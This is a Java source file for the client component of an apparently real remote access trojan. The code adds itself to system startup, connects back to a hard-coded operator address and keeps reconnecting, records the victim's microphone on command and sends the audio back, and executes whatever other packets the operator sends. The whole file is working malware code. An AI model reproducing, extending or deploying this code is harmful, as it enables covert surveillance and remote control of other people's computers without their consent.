package de.sogomn.rat;

import java.io.File;
import java.net.URI;

import de.sogomn.rat.gui.ChatWindow;
import de.sogomn.rat.gui.IGuiController;
import de.sogomn.rat.packet.ChatPacket;
import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.VoicePacket;
import de.sogomn.rat.util.Resources;
import de.sogomn.rat.util.VoiceRecorder;

public final class Client implements IConnectionObserver, IGuiController {
	
	private ActiveConnection connection;
	
	private ChatWindow chat;
	
	private static final int VOICE_BUFFER_SIZE = 1024 << 8;
	private static final int CONNECTION_INTERVAL = 5000;
	
	public Client(final ActiveConnection connection) {
		this.connection = connection;
		
		chat = new ChatWindow();
		
		chat.addListener(this);
	}
	
	private void handleVoiceRequest(final ActiveConnection connection) {
		final VoiceRecorder voiceRecorder = new VoiceRecorder(VOICE_BUFFER_SIZE);
		
		voiceRecorder.setObserver(recorder -> {
			final byte[] data = recorder.getLastRecord();
			final VoicePacket packet = new VoicePacket(data);
			
			connection.addPacket(packet);
			recorder.stop();
		});
		voiceRecorder.start();
	}
	
	private void handleChatPacket(final ChatPacket packet) {
		final String message = packet.getMessage();
		
		if (!chat.isVisible()) {
			chat.setVisible(true);
		}
		
		chat.addLine(message);
	}
	
	@Override
	public void packetReceived(final ActiveConnection connection, final IPacket packet) {
		final Class<? extends IPacket> clazz = packet.getClass();
		
		if (clazz == VoicePacket.class) {
			handleVoiceRequest(connection);
		} else if (clazz == ChatPacket.class) {
			final ChatPacket chatPacket = (ChatPacket)packet;
			
			handleChatPacket(chatPacket);
		} else {
			packet.execute(connection);
		}
	}
	
	@Override
	public void disconnected(final ActiveConnection connection) {
		final String address = connection.getAddress();
		final int port = connection.getPort();
		
		chat.close();
		connection.setObserver(null);
		
		startClient(address, port);
	}
	
	@Override
	public void userInput(final String command, final Object source) {
		if (command == ChatWindow.MESSAGE_SENT) {
			final String message = chat.getMessage();
			final ChatPacket packet = new ChatPacket(message);
			
			connection.addPacket(packet);
		}
	}
	
	/*
	 * ==================================================
	 * ==================================================
	 * ==================================================
	 */
	
	private static void addToStartup() {
		try {
			final URI sourceUri = Server.class.getProtectionDomain().getCodeSource().getLocation().toURI();
			final File source = new File(sourceUri);
			
			Resources.OS_SERVICE.addToStartup(source);
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public static void startClient(final String address, final int port) {
		final ActiveConnection connection = new ActiveConnection(address, port);
		
		if (!connection.isOpen()) {
			try {
				Thread.sleep(CONNECTION_INTERVAL);
			} catch (final Exception ex) {
				//...
			} finally {
				System.gc();
				startClient(address, port);
			}
			
			return;
		}
		
		final Client client = new Client(connection);
		
		connection.setObserver(client);
		connection.start();
	}
	
	public static void main(final String[] args) {
		addToStartup();
		Resources.setSystemLookAndFeel();
		startClient(Resources.ADDRESS, Resources.PORT);
	}
	
}
